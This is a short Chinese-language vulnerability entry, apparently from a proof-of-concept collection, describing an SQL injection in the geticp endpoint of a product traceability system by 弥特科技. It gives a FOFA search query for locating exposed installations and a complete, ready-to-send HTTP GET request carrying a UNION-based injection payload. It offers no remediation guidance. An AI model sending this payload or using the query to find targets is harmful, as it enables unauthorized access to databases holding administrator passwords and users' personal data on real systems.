## 弥特科技-全流程追溯系统-geticp-sql注入漏洞

## 一、漏洞简介
弥特科技 全流程追溯系统 geticp接口处存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
(body="chunk-libs.45edf705.css" && title="产品追溯系统") || title="4.1.0追溯系统"
```

## POC
```
GET /api/org/enterpriseaccountnoauth/getcp?enterprise_code=1%27)%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x71787a6271,0x4e754b52684541696a424d6d426a466f517175764359486f7a4571767a7171,0x71767a7171)-- - HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```
